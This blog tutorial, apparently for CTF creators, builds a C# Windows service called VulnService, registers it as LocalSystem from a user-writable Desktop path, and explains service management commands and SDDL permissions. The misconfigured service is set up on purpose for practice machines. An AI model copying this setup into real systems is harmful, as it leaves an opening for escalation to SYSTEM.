---
title: Windows Local Privilege Escalation - Services for CTF Creators
draft: false
author: "pwnlog"
authorLink: ""
description: "Windows Local Privilege Escalation - Services"
license: ""
images: []
date: 2022-03-20 11:35:00 +0800
categories: [Windows Local Privilege Escalation]
tags: [services, unquoted path service, insecure registry hives, insecure service executable, insecure service permissions, local privilege escalation, windows]

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: false
rssFullText: false

code:
  copy: true
  maxShownLines: -1
  # ...
math:
  enable: true
  # ...
mapbox:
  accessToken: ""
  # ...
share:
  enable: true
  # ...
comment:
  enable: true
  # ...
library:
  css:
    # someCSS = "some.css"
    # located in "assets/"
    # Or
    # someCSS = "https://cdn.example.com/some.css"
  js:
    # someJS = "some.js"
    # located in "assets/"
    # Or
    # someJS = "https://cdn.example.com/some.js"
seo:
  images: []
  # ...

summary: "Which users or should I say which permissions are running in those services? (8_9)"
---

# Services

Services are programs that run in the background. Most of them perform tasks, while others can accept input and process data. If services are run by the LocalSystem account instead of the LocalService account, it means that we can escalate privileges to the `NT-AUTHORITY\SYSTEM (LocalSystem)` account if the service is misconfigured. The `LocalSystem` account, known as `NT-AUTHORITY\SYSTEM`, is a powerful account with unrestricted access to all local system resources, which can be dangerous. As a rule of thumb, we should always try to run these services as the `LocalService` account (`NT AUTHORITY\LocalService`) or the `NetworkService` account (`NT-AUTHORITY\NetworkService`), especially for custom services written in C++ or C#.

Services can be developed in `C++` or `C#`:
- **C++**: The most traditional way to develop a service.
- **C#**: Utilizes the .NET framework to develop services more easily and with less code.

> Note: Modern services are being developed with [BackgroundService](https://docs.microsoft.com/en-us/dotnet/core/extensions/windows-service) and the [Worker Services in .NET framework](https://docs.microsoft.com/en-us/dotnet/core/extensions/workers).

In Windows Server 2003 [we **cannot** run a scheduled task](https://serverfault.com/a/513829/4822) with the following service accounts:

-   `NT_AUTHORITY\LocalService` (also known as the Local Service account)
-   `NT AUTHORITY\NetworkService` (also known as the Network Service account)

That capability only was added with [Task Scheduler 2.0](http://msdn.microsoft.com/en-us/library/windows/desktop/aa383614%28v=vs.85%29.aspx), which only exists in Windows Vista/Windows Server 2008 and newer.

> Note: We can always find more information about services in the [microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/services/services).

## Service Access Rights  

Services have an ACL attached to them. As system administrators and as developers we must be careful about the access rights that we assign to these services. The Service Control Manager (SCM) creates a service object’s security descriptor when the service is installed, this is done by the **CreateService** function. The default security descriptor of a service object grants the following access rights:

| Account                    | Access Rights                                                                                                                                                                                                                                            |
|----------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Remote Authenticated Users | These access rights are the same as the Local Authenticated Users.                                                                                                                                                                                       |
| Local Authenticated Users  | READ_CONTROL<br /> SERVICE_ENUMERATE_DEPENDENTS<br /> SERVICE_INTERROGATE<br /> SERVICE_QUERY_CONFIG<br /> SERVICE_QUERY_STATUS<br /> SERVICE_USER_DEFINED_CONTROL<br />                                                                                 |
| LocalSystem                | READ_CONTROL<br /> SERVICE_ENUMERATE_DEPENDENTS<br /> SERVICE_INTERROGATE<br /> SERVICE_PAUSE_CONTINUE<br /> SERVICE_QUERY_CONFIG<br /> SERVICE_QUERY_STATUS<br /> SERVICE_QUERY_START<br /> SERVICE_QUERY_STOP<br /> SERVICE_USER_DEFINED_CONTROL<br /> |
| Administrators             | DELETE<br /> READ_CONTROL<br /> SERVICE_ALL_ACCESS<br /> WRITE_DAC<br /> WRITE_OWNER<br />                                                                                                                                                               |


These are the most interesting access rights:

- **SERVICE_QUERY_CONFIG**: Allows us to query the service configuration.
- **SERVICE_QUERY_STATUS**: Allows us to query the status of the service.
- **SERVICE_START**: Allows us to start the service.
- **SERVICE_STOP**: Allows us to stop the service.
- **SERVICE_CHANGE_CONFIG**: Allows us to change the configuration of the service.
- **SERVICE_ALL_ACCESS**: Allows us to do anything on the service.

## Custom Service in C Sharp .NET Framework

{{< admonition warning >}}
The code in this section is sourced from the official Microsoft documentation. As engineers working on vulnerable machines or creating Capture The Flag (CTF) challenges, it is essential to develop our own code and, more importantly, to be creative with it. Our goal should always be to provide a valuable learning experience for CTF players. Repetitive vulnerabilities or challenges can diminish the learning experience over time, so creativity is key to maintaining engagement and educational value.

Why did I choose to do this?

As developers, it is crucial to be familiar with MSDN and the wealth of information available in Microsoft documentation. We do not always need a course, tutorial, write-up, or video to learn how to accomplish specific tasks, as much of this information is already well-documented. By reading this section, I hope you will become more aware of the resources available through documentation alone, enabling you to independently search for and create your own solutions.

Once again, I want to clarify that this code is not my own.
{{< /admonition >}}

We'll create a service following the [official documentation at microsoft](https://docs.microsoft.com/en-us/dotnet/framework/windows-services/walkthrough-creating-a-windows-service-application-in-the-component-designer). I'll pretty much do the same thing **EXCEPT** that we'll build the service with the [Service Control Manager](https://docs.microsoft.com/en-us/windows/win32/services/service-control-manager). I'm gonna use Visual Studio Community 2022, I have already installed the workload of .NET desktop development with the Visual Studio Installer as shown below:

{{< image src="/images/posts/vs-installer-net.png" caption="VS Installer " src_s="/images/posts/vs-installer-net.png" src_l="/images/posts/vs-installer-net.png" >}}

### Visual Studio Project - Create a Service

We'll begin by creating a project:

{{< image src="/images/posts/vs-1.png" caption="VS Create Project " src_s="/images/posts/vs-1.png" src_l="/images/posts/vs-1.png" >}}

Now we'll select the project template **Windows Service (.NET Framework)**:

{{< image src="/images/posts/vs-2.png" caption="VS Project Template " src_s="/images/posts/vs-2.png" src_l="/images/posts/vs-2.png" >}}

We'll rename the project, select a destination directory, and the .NET Framework:

{{< image src="/images/posts/vs-3.png" caption="VS Destination " src_s="/images/posts/vs-3.png" src_l="/images/posts/vs-3.png" >}}

Now the **Design** tab appears (**Service1.cs [Design]**) this project template includes a component class named `Service1` that inherits from [System.ServiceProcess.ServiceBase](https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase) and according to the writeup it includes much of the basic service code:

{{< image src="/images/posts/vs-4.png" caption="VS Service " src_s="/images/posts/vs-4.png" src_l="/images/posts/vs-4.png" >}}

We'll rename the service from **Service1** to **VulnService**, we can do this from the **Solution Explorer**, select **Service1.cs** and choose **Rename (F2)** from the shortcut menu. Rename the file to **VulnService.cs** and then press **Enter**:

{{< image src="/images/posts/vs-5.png" caption="VS " src_s="/images/posts/vs-5.png" src_l="/images/posts/vs-5.png" >}}

A pop-up window will appear asking whether we would like to rename all references to the code element  _Service1_. In the pop-up window, we're gonna select **Yes**:

{{< image src="/images/posts/vs-6.png" caption="VS " src_s="/images/posts/vs-6.png" src_l="/images/posts/vs-6.png" >}}

In the **Design** tab, we're gonna **right-click from the mouse** and select **Properties** from the shortcut menu:

{{< image src="/images/posts/vs-7.png" caption="VS " src_s="/images/posts/vs-7.png" src_l="/images/posts/vs-7.png" >}}

Now in the **Properties** window, we're going to change the **ServiceName** value to _VulnService_:

{{< image src="/images/posts/vs-8.png" caption="VS " src_s="/images/posts/vs-8.png" src_l="/images/posts/vs-8.png" >}}

Then we're going to select **Save All (Ctrl+Shift+S)** from the **File** menu:

{{< image src="/images/posts/vs-9.png" caption="VS " src_s="/images/posts/vs-9.png" src_l="/images/posts/vs-9.png" >}}

### Adding Features To The Service

In this section, we'll add a custom event log to the Windows service created by MS developers. The [EventLog](https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.eventlog) component is an example of the type of component we can add to a Windows service.

> Note: When creating a vulnerable machine / CTF machine create a cool service that is fun for the competitors. In this example, I'm only using MS code provided for building up a scenario.

In the **Solution Explorer**, from the shortcut menu for **VulnService.cs** we'll choose **View Designer (Shift+F7)**:

{{< image src="/images/posts/vs-10.png" caption="VS " src_s="/images/posts/vs-10.png" src_l="/images/posts/vs-10.png" >}}

In the **Toolbox**, we're gonna expand **Components**, and then drag the **EventLog** component to the **Service1.cs [Design]** tab:

{{< image src="/images/posts/vs-11.png" caption="VS " src_s="/images/posts/vs-11.png" src_l="/images/posts/vs-11.png" >}}

In the **Solution Explorer**, from the shortcut menu for **VulnService.cs** we'll click on **View Code (F7)**:

{{< image src="/images/posts/vs-12.png" caption="VS " src_s="/images/posts/vs-12.png" src_l="/images/posts/vs-12.png" >}}

We're gonna define a custom event log, Define a custom event log we're editing the existing `VulnService()` constructor as shown in the following code snippet:

```csharp
public VulnService()
{
	InitializeComponent();
	eventLog1 = new System.Diagnostics.EventLog();
	if (!System.Diagnostics.EventLog.SourceExists("MySource"))
	{
		System.Diagnostics.EventLog.CreateEventSource(
			"MySource", "MyNewLog");
	}
	eventLog1.Source = "MySource";
	eventLog1.Log = "MyNewLog";
}
```

Add a `using` statement to **VulnService.cs** (if it doesn't already exist), or an `Imports` statement to **VulnService.vb**, for the [System.Diagnostics](https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics) namespace:

```csharp
using System.Diagnostics;
```

Now we're gonna select **Save All** from the **File** menu:

{{< image src="/images/posts/vs-9.png" caption="VS Save All " src_s="/images/posts/vs-9.png" src_l="/images/posts/vs-9.png" >}}

### Service Startup

Now we're gonna define the event that occurs when the service is started. In the code editor for **VulnService.cs**, we'll locate the [OnStart](https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase.onstart) method. Visual Studio automatically created an empty method definition when we created the project so we'll simply add code that writes an entry to the event log when the service starts:

```csharp
protected override void OnStart(string[] args)
{
    eventLog1.WriteEntry("In OnStart.");
}
```

Since a service application is designed to be long-running, it usually polls or monitors the system, which we can set up in the [OnStart](https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase.onstart) method. We'll do this because we don't want the system to be blocked; the 'OnStart' method must return to the operating system when the service's operation has begun.

We'll set up a simple polling mechanism by using the [System.Timers.Timer](https://docs.microsoft.com/en-us/dotnet/api/system.timers.timer) component. This timer uses an [Elapsed](https://docs.microsoft.com/en-us/dotnet/api/system.timers.timer.elapsed) event at regular intervals, at which time the service can do its monitoring. 

Add a `using` statement to **VulnSevice.cs** for the [System.Timers](https://docs.microsoft.com/en-us/dotnet/api/system.timers) namespace:

```csharp
using System.Timers;
```

We're gonna add the following code in the `VulnService.OnStart` event to set up the polling mechanism.

```csharp
// Set up a timer that triggers every minute.
Timer timer = new Timer();
timer.Interval = 60000; // 60 seconds
timer.Elapsed += new ElapsedEventHandler(this.OnTimer);
timer.Start();
```

In the `VulnService` class, we'll add the `OnTimer` method to handle the [Timer.Elapsed](https://docs.microsoft.com/en-us/dotnet/api/system.timers.timer.elapsed) event:

```csharp
public void OnTimer(object sender, ElapsedEventArgs args)
{
    // TODO: Insert monitoring activities here.
    eventLog1.WriteEntry("Monitoring the System", EventLogEntryType.Information, eventId++);
}
```

In the `VulnService` class, we'll add a member variable that contains the identifier of the next event to write into the event log:

```csharp
private int eventId = 1;
```

### Service Stop

Now we're gonna define the event that occurs when the service is stopped. We'll insert a line of code in the [OnStop](https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase.onstop) method which adds an entry to the event log when the service is stopped:

```csharp
protected override void OnStop()
{
    eventLog1.WriteEntry("In OnStop.");
}
```

### General Actions

We're gonna override the [OnPause](https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase.onpause), [OnContinue](https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase.oncontinue), and [OnShutdown](https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase.onshutdown) methods to define additional processing for your component. The following code shows how we can override the [OnContinue](https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase.oncontinue) method in the `VulnService` class:

```csharp
protected override void OnContinue()
{
    eventLog1.WriteEntry("In OnContinue.");
}
```

### Setting Service Status

An essential part of a service is report of its status to the [Service Control Manager](https://docs.microsoft.com/en-us/windows/desktop/Services/service-control-manager) this way a user can notice whether a service is functioning correctly. According to the documentation, by default, a service that inherits from [ServiceBase](https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase) reports a limited set of status settings, which include:
- SERVICE_STOPPED: When the service stops
- SERVICE_PAUSED: When the service is paused
- SERVICE_RUNNING: When the service is running 
- SERVICE_START_PENDING: When the service is pending to start, it can fail.

We'll add a `using` statement to **VulnService.cs** for the [System.Runtime.InteropServices](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices) namespace:

```csharp
using System.Runtime.InteropServices;
```

Then we're going to add the following code to **VulnService.cs** which it'll declare the `ServiceState` values and add a structure for the status, which we'll use in a platform invoke call:

```csharp
public enum ServiceState
{
    SERVICE_STOPPED = 0x00000001,
    SERVICE_START_PENDING = 0x00000002,
    SERVICE_STOP_PENDING = 0x00000003,
    SERVICE_RUNNING = 0x00000004,
    SERVICE_CONTINUE_PENDING = 0x00000005,
    SERVICE_PAUSE_PENDING = 0x00000006,
    SERVICE_PAUSED = 0x00000007,
}

[StructLayout(LayoutKind.Sequential)]
public struct ServiceStatus
{
    public int dwServiceType;
    public ServiceState dwCurrentState;
    public int dwControlsAccepted;
    public int dwWin32ExitCode;
    public int dwServiceSpecificExitCode;
    public int dwCheckPoint;
    public int dwWaitHint;
};
```

In the `VulnService` class we'll declare the [SetServiceStatus](https://docs.microsoft.com/en-us/windows/desktop/api/winsvc/nf-winsvc-setservicestatus) function by using [platform invoke](https://docs.microsoft.com/en-us/dotnet/framework/interop/consuming-unmanaged-dll-functions):

```csharp
[DllImport("advapi32.dll", SetLastError = true)]
private static extern bool SetServiceStatus(System.IntPtr handle, ref ServiceStatus serviceStatus);
```

Now we'll implement the SERVICE_START_PENDING status by adding the following code to the **beginning** of the [OnStart](https://docs.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicebase.onstart) method:

```csharp
// Update the service state to Start Pending.
ServiceStatus serviceStatus = new ServiceStatus();
serviceStatus.dwCurrentState = ServiceState.SERVICE_START_PENDING;
serviceStatus.dwWaitHint = 100000;
SetServiceStatus(this.ServiceHandle, ref serviceStatus);
```

Now we'll add this code to the **end** of the `OnStart` method to set the status to SERVICE_RUNNING:

```csharp
// Update the service state to Running.
serviceStatus.dwCurrentState = ServiceState.SERVICE_RUNNING;
SetServiceStatus(this.ServiceHandle, ref serviceStatus);
```

Optionally, we'll implement the SERVICE_STOP_PENDING status and return the SERVICE_STOPPED status before the `OnStop` method exits:

```csharp
// Update the service state to Stop Pending.
ServiceStatus serviceStatus = new ServiceStatus();
serviceStatus.dwCurrentState = ServiceState.SERVICE_STOP_PENDING;
serviceStatus.dwWaitHint = 100000;
SetServiceStatus(this.ServiceHandle, ref serviceStatus);

// Update the service state to Stopped.
serviceStatus.dwCurrentState = ServiceState.SERVICE_STOPPED;
SetServiceStatus(this.ServiceHandle, ref serviceStatus);
```

The `VulnService.cs` file ends up looking something like this:

```csharp
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Runtime.InteropServices;

namespace VulnService
{
    public partial class VulnService : ServiceBase
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool SetServiceStatus(System.IntPtr handle, ref ServiceStatus serviceStatus);

        private int eventId = 1;
        public VulnService()
        {
            InitializeComponent();
            eventLog1 = new System.Diagnostics.EventLog();
            if (!System.Diagnostics.EventLog.SourceExists("MySource"))
            {
                System.Diagnostics.EventLog.CreateEventSource(
                    "MySource", "MyNewLog");
            }
            eventLog1.Source = "MySource";
            eventLog1.Log = "MyNewLog";
        }

        protected override void OnStart(string[] args)
        {
            // Update the service state to Start Pending.
            ServiceStatus serviceStatus = new ServiceStatus();
            serviceStatus.dwCurrentState = ServiceState.SERVICE_START_PENDING;
            serviceStatus.dwWaitHint = 100000;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);

            eventLog1.WriteEntry("In OnStart.");
            // Set up a timer that triggers every minute.
            Timer timer = new Timer();
            timer.Interval = 60000; // 60 seconds
            timer.Elapsed += new ElapsedEventHandler(this.OnTimer);
            timer.Start();

            // Update the service state to Running.
            serviceStatus.dwCurrentState = ServiceState.SERVICE_RUNNING;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);
        }

        protected override void OnStop()
        {
            eventLog1.WriteEntry("In OnStop.");

            // Update the service state to Stop Pending.
            ServiceStatus serviceStatus = new ServiceStatus();
            serviceStatus.dwCurrentState = ServiceState.SERVICE_STOP_PENDING;
            serviceStatus.dwWaitHint = 100000;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);

            // Update the service state to Stopped.
            serviceStatus.dwCurrentState = ServiceState.SERVICE_STOPPED;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);
        }

        protected override void OnContinue()
        {
            eventLog1.WriteEntry("In OnContinue.");
        }

        public void OnTimer(object sender, ElapsedEventArgs args)
        {
            // TODO: Insert monitoring activities here.
            eventLog1.WriteEntry("Monitoring the System", EventLogEntryType.Information, eventId++);
        }
        public enum ServiceState
        {
            SERVICE_STOPPED = 0x00000001,
            SERVICE_START_PENDING = 0x00000002,
            SERVICE_STOP_PENDING = 0x00000003,
            SERVICE_RUNNING = 0x00000004,
            SERVICE_CONTINUE_PENDING = 0x00000005,
            SERVICE_PAUSE_PENDING = 0x00000006,
            SERVICE_PAUSED = 0x00000007,
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct ServiceStatus
        {
            public int dwServiceType;
            public ServiceState dwCurrentState;
            public int dwControlsAccepted;
            public int dwWin32ExitCode;
            public int dwServiceSpecificExitCode;
            public int dwCheckPoint;
            public int dwWaitHint;
        };
    }
}

```

This is how the `Program.cs` code looks like this as well:

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace VulnService
{
    internal static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        static void Main()
        {
            ServiceBase[] ServicesToRun;
            ServicesToRun = new ServiceBase[]
            {
                new VulnService()
            };
            ServiceBase.Run(ServicesToRun);
        }
    }
}

```

This is when we'll **STOP** following the documentation. I believe in Microsoft documentation so I thought that it'll be ideal for building the fundamentals of building services with .NET framework. At least, if you didn't know what a .NET service code looked like, well now you know. As always, we as CTF creators should be creative in the services that we want to create.

## Building The Service using SC

We'll build the solution now:

{{< image src="/images/posts/vs-13.png" caption="VS Build Solution " src_s="/images/posts/vs-13.png" src_l="/images/posts/vs-13.png" >}}

Let's see if the executable was compiled or created:

```powershell
PS C:\> dir C:\Users\user\Desktop\VulnService\VulnService\bin\Debug\VulnService.exe


    Directory: C:\Users\user\Desktop\VulnService\VulnService\bin\Debug


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/9/2022  12:06 AM           7168 VulnService.exe
```

We're gonna run a command prompt as **administrator** or a PowerShell console as **administrator** to create the service:

```powershell
C:\Windows\system32>sc.exe create "VulnService" binpath= "C:\Users\user\Desktop\VulnService\VulnService\bin\Debug\VulnService.exe"
[SC] CreateService SUCCESS
```

Let's query the configuration of the service:

```powershell
C:\Windows\system32>sc qc "VulnService"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VulnService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\user\Desktop\VulnService\VulnService\bin\Debug\VulnService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VulnService
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Now we're gonna attempt to start the service:

```powershell
C:\Windows\system32>sc start "VulnService"

SERVICE_NAME: VulnService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4892
        FLAGS              :
```

> Note: We can see the START_PENDING state.

Now we are going to query the current status of a service:

```powershell
C:\Windows\system32>sc query "VulnService"

SERVICE_NAME: VulnService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

We can see at the STATE value that's RUNNING.

Now let's see if we can stop the service:

```powershell
C:\Windows\system32>sc stop "VulnService"

SERVICE_NAME: VulnService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

> Note: We can see the STOP_PENDING state.

Again we are going to query the current status of a service:

```powershell
C:\Windows\system32>sc query "VulnService"

SERVICE_NAME: VulnService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

The service STATE value changed to STOPPED, so the service stopped.

Now we know that the service worked successfully as expected.

## Managing Services with Services.msc

Most system administrators use the `services.msc` application to manage services:

{{< image src="/images/posts/services-msc.png" caption="Services.msc " src_s="/images/posts/services-msc.png" src_l="/images/posts/services-msc.png" >}}

The Service Control Manager assigns the user LocalSystem upon creating a service by default and custom services shouldn't be run as `NT AUTHORITY\SYSTEM`:

{{< image src="/images/posts/sc-localsystem.png" caption="Service Account LocalSystem " src_s="/images/posts/sc-localsystem.png" src_l="/images/posts/sc-localsystem.png" >}}

If we can compromise this service we can escalate to LocalSystem ( `NT AUTHORITY\SYSTEM`).

## Managing Services via Service Control Manager

Query the configuration of a service:

```
sc.exe qc <name>
```

Query the current status of a service:

```
sc.exe query <name>
```

Modify the configuration of a service:

```
sc.exe config <name> <option>= <value>
```

Start or Stop a service:

```
sc start "VulnService"
sc stop "VulnService"
```

> Note: This Service Control Manager commands don't work well with PowerShell, they must be runned from a command-prompt.

## Managing Services via WMIC

Alternatively, we can use wmic:

```powershell
C:\Windows\system32>wmic service VulnService call startservice
Executing (\\desktop-bn\ROOT\CIMV2:Win32_Service.Name="VulnService")->startservice()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
};


C:\Windows\system32>wmic service VulnService call stopservice
Executing (\\desktop-bn\ROOT\CIMV2:Win32_Service.Name="VulnService")->stopservice()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
};
```

> Note: This WMIC commands don't work well with PowerShell, they must be runned from a command-prompt.

## Managing Services via NET

We can also use the net command:

```powershell
C:\Windows\system32>net stop VulnService
The VulnService service is stopping.
The VulnService service was stopped successfully.

C:\Windows\system32>net start VulnService
The VulnService service is starting.
The VulnService service was started successfully.
```

## Managing Services via PowerShell

CMD is old and modern attacks execute cmdlets in memory to avoid detection. We could also create custom cmdlets to be more stealthy, but that's beyond this article. I'm gonna keep it simple and just demonstrate some cmdlets that we can use to manage services and nothing more.

The following cmdlets are in **PowerShell 7.2 (LTS)**.

Get help on service cmdlets:

```powershell
PS C:\Windows\system32> Get-Help *-Service                                                                                                                                                                                                                                                                                                                                                                    Resume-Service                    Cmdlet    Microsoft.PowerShell.M... Resume-Service...
Restart-Service                   Cmdlet    Microsoft.PowerShell.M... Restart-Service...
Set-Service                       Cmdlet    Microsoft.PowerShell.M... Set-Service...
Get-Service                       Cmdlet    Microsoft.PowerShell.M... Get-Service...
Suspend-Service                   Cmdlet    Microsoft.PowerShell.M... Suspend-Service...
Start-Service                     Cmdlet    Microsoft.PowerShell.M... Start-Service...
Stop-Service                      Cmdlet    Microsoft.PowerShell.M... Stop-Service...
New-Service                       Cmdlet    Microsoft.PowerShell.M... New-Service...
```

Find information about a service using its name:

```powershell
PS C:\Windows\system32> Get-Service -Name VulnService

Status   Name               DisplayName
------   ----               -----------
Running  VulnService        VulnService
```

Find information about a service using its display name:

```powershell
PS C:\Windows\system32> Get-Service -DisplayName VulnService

Status   Name               DisplayName
------   ----               -----------
Running  VulnService        VulnService
```

Find information about services running on remote computers or workstations:

```powershell
Get-Service -ComputerName Server01
```

> Note: The ComputerName parameter accepts multiple values and wildcard characters, so you can get the services on multiple computers with a single command.

The following cmdlet gets the services that the LanmanWorkstation service requires:

```powershell
Get-Service -Name LanmanWorkstation -RequiredServices
```

The following cmdlet gets the services that require the LanmanWorkstation service:

```powershell
Get-Service -Name LanmanWorkstation -DependentServices
```

We can even get all services that have dependencies. The following cmdlet does just that, and then it uses the Format-Table cmdlet to display the Status, Name, RequiredServices and DependentServices properties of the services on the computer:

```powershell
Get-Service -Name * | Where-Object {$_.RequiredServices -or $_.DependentServices} |
  Format-Table -Property Status, Name, RequiredServices, DependentServices -auto
```

We can stop service with the following cmdlet:

```powershell
PS C:\Windows\system32> Stop-Service -Name VulnService
PS C:\Windows\system32> Get-Service -Name VulnService

Status   Name               DisplayName
------   ----               -----------
Stopped  VulnService        VulnService
```

We can start a service with the following cmdlet:

```powershell
PS C:\Windows\system32> Start-Service -Name VulnService
PS C:\Windows\system32> Get-Service -Name VulnService

Status   Name               DisplayName
------   ----               -----------
Running  VulnService        VulnService
```

We can suspend service with the following cmdlet (we didn't add suspend support):

```powershell
Suspend-Service -Name <name>
```

We can restart a service with the following cmdlet:

```powershell
PS C:\Windows\system32> Restart-Service -Name VulnService
PS C:\Windows\system32> Get-Service -Name VulnService

Status   Name               DisplayName
------   ----               -----------
Running  VulnService        VulnService
```

If we are an administrator we could also set up service properties with the `Set-Service` cmdlet, this can be done on a local or remote computer. Additionally, we could change the startup type of the service with the `StartupType` parameter.

# Services Permissions

Each service can have a set of permissions, just as file system objects and registry keys. Who can stop, query, change the startup type, edit the service configuration, or delete the service depending on its permission entries?

In this section, we’ll see how to view service permissions and modify them. There are many tools available to query and/or modify the service permissions. We'll see a few methods.

> Note: These are the [service security and access rights](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) in Windows.

The permissions of a service is stored in this registry key, in a `REG_BINARY` value named `Security`:

```powershell
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\[service_name]\Security
```

## View service permissions

We'll see a few methods that we can use to view service permissions.

### SC.exe

We're gonna use a command prompt command line as **administrator**:

```powershell
C:\Users\user>sc.exe sdshow "VulnService"

D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
```

It returns an SDDL output called “security descriptors” that looks like the following:

```powershell
D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
```

The above output shows the `VulnService` service’s permission entries in Security Descriptor Definition Language (SDDL) format.

_The SDDL output can contain either DACL or SACL entries. A DACL identifies users and groups who are allowed or denied access to an object. The SACL defines how access is audited on an object. SACL enables administrators to log attempts to access a secured object._

> Note: In this article, we'll only cover the DACL (denoted by the `D:` at the beginning.) SACL is for a different purpose and is out of the scope of this article.

Here is a list of tables that describe the meaning of each security descriptor:

| D: | Discretionary Access Control List (DACL) |
|----|------------------------------------------|
| S: | System Access Control List (SACL)        |

| ACE type | Meaning        |
|----------|----------------|
| A        | Access Allowed |

| ACE flags string | Meaning                      |                                                                                    |
|------------------|------------------------------|------------------------------------------------------------------------------------|
| CC               | SERVICE_QUERY_CONFIG         | Query the SCM for the service configuration                                        |
| LC               | SERVICE_QUERY_STATUS         | Query the SCM the current status of the service                                    |
| SW               | SERVICE_ENUMERATE_DEPENDENTS | List dependent services                                                            |
| LO               | SERVICE_INTERROGATE          | Query the service its current status                                               |
| RC               | READ_CONTROL                 | Query the security descriptor of the service                                       |
| RP               | SERVICE_START                | Start the service                                                                  |
| DT               | SERVICE_PAUSE_CONTINUE       | Pause/Resume the service                                                           |
| CR               | SERVICE_USER_DEFINED_CONTROL | Required to call the CreateService function to specify a user-defined control code |
| WD               | WRITE_DAC                    | Change the permissions of the service                                              |
| WO               | WRITE_OWNER                  | Change the owner in the object’s security descriptor                               |
| WP               | SERVICE_STOP                 | Stop the service                                                                   |
| DC               | SERVICE_CHANGE_CONFIG        | Change service configuration                                                       |
| SD               | DELETE                       | The right to delete the service                                                    |

_We can find more information at [ACE Strings](https://docs.microsoft.com/en-us/windows/win32/secauthz/ace-strings) and [Service Security and Access Rights](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) at Microsoft Docs website._

The security principal issued with these rights is represented by the final two characters after the ACE strings.

| Abbreviation | Security Principal      |
|--------------|-------------------------|
| AU           | Authenticated Users     |
| BA           | Built-in administrators |
| SY           | Local System            |
| BU           | Built-in users          |
| WD           | Everyone                |

Let’s see what rights the “built-in administrators” group has, as per this SDDL.

```powershell
D:
(A;;CCLCSWRPWPDTLOCRRC;;;SY)
(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA) # Full permissions
(A;;CCLCSWLOCRRC;;;IU)
(A;;CCLCSWLOCRRC;;;SU)
```

The `Built-in administrators` group has full permission:

```powershell
(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
```

| ACE flags string |                              |                                                 |
|------------------|------------------------------|-------------------------------------------------|
| CC               | SERVICE_QUERY_CONFIG         | Query the SCM for the service configuration     |
